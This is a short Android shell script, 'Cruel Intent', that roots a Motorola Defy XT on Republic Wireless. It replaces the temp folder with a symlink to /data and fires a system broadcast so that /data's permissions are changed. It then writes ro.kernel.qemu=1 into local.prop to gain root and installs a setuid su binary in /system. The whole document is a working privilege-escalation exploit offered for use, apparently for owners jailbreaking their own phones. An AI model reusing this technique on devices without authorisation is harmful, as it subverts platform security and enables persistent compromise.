#!/system/bin/sh
echo "Cruel Intent"
echo "Motorola Defy XT Root"
echo "For Republic Wireless"
echo "By jcase (Team AndIRC) jcase@cunninglogic.com"
echo "Donations are welcome here, or any any good charity:"
echo "https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=U3JKACE7SN7RC"
echo "Version 1.1"
echo "#######################################################"

  case $1 in
   "-break")
	rm -r /data/local/tmp
	ln -s /data /data/local/tmp
	am broadcast -a android.intent.action.OPEN_TMPFOLDER_ACCESS_RIGHT
	sleep 5
	echo 'ro.kernel.qemu=1' > /data/local.prop
	rm /data/local/tmp
	echo "Please reboot your phone"
	break;;
   "-fix")
	mount -o remount,rw /dev/block/mtdblock9 /system
	cat /data/local/su > /system/xbin/su
	chown 0.0 /system/xbin/su
	chmod 06755 /system/xbin/su
	rm /data/local.prop
	echo "Please install the Supersu app, and enjoy"
	reboot
	break;;
   *)
  esac